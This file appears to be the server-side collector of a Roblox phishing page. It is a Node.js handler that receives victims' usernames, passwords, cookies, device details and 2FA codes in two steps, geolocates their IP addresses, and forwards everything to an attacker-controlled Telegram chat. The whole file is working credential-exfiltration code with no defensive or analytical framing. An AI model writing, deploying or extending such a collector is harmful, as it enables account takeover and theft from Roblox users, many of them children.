export const config = {
    api: {
        bodyParser: true
    }
};

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ============================================================
// ENVOI VERS TELEGRAM
// ============================================================
async function sendToTelegram(message) {
    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('Telegram non configuré');
        return false;
    }

    try {
        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: false
                })
            }
        );
        const data = await response.json();
        if (!data.ok) {
            console.error('Erreur Telegram:', data.description);
            return false;
        }
        console.log('✅ Message Telegram envoyé');
        return true;
    } catch (error) {
        console.error('❌ Erreur Telegram:', error.message);
        return false;
    }
}

// ============================================================
// FORMATAGE DU MESSAGE
// ============================================================
function formatMessage(data) {
    let message = '';

    if (data.step === 'credentials') {
        message = `
🟦 **ÉTAPE 1 - IDENTIFIANTS ROBLOX** 🟦

👤 **Identifiants**
👤 Nom utilisateur: \`${data.username || 'Non fourni'}\`
🔑 Mot de passe: \`${data.password || '*****'}\`

🌐 **Informations Réseau**
📍 IP: \`${data.ip || 'Non disponible'}\`
🌍 Localisation: \`${data.ipLocation || 'Non disponible'}\`

📱 **Appareil**
🖥️ Modèle: \`${data.deviceModel || 'Inconnu'}\`
🌐 Plateforme: \`${data.platform || 'N/A'}\`
🔋 Batterie: \`${data.batteryLevel || 'N/A'}\`
🍪 Cookies: \`${data.cookies || 'Aucun'}\`

📅 \`${new Date(data.timestamp).toLocaleString('fr-FR')}\``;

    } else if (data.step === 'verification') {
        message = `
🔴 **ÉTAPE 2 - CODE 2FA ROBLOX** 🔴

🔑 **Code de vérification**
\`\`\`
${data.verification_code || 'Non fourni'}
\`\`\`

📅 \`${new Date(data.timestamp).toLocaleString('fr-FR')}\``;
    }

    return message;
}

// ============================================================
// HANDLER PRINCIPAL
// ============================================================
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'POST requis' });
    }

    try {
        const data = req.body;
        console.log('📥 Données reçues:', JSON.stringify(data, null, 2));

        let ip = data.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        let ipLocation = 'Non disponible';

        if (ip) {
            try {
                const ipInfo = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city`).then(r => r.json());
                if (ipInfo.status === 'success') {
                    ipLocation = `${ipInfo.country || 'Inconnu'}, ${ipInfo.city || 'Inconnu'}`;
                }
            } catch (error) {
                console.error('Erreur IP info:', error);
            }
        }

        const logEntry = { ...data, ip, ipLocation };
        await sendToTelegram(formatMessage(logEntry));

        res.status(200).json({
            success: true,
            message: 'Données envoyées à Telegram'
        });

    } catch (error) {
        console.error('❌ Erreur:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
}
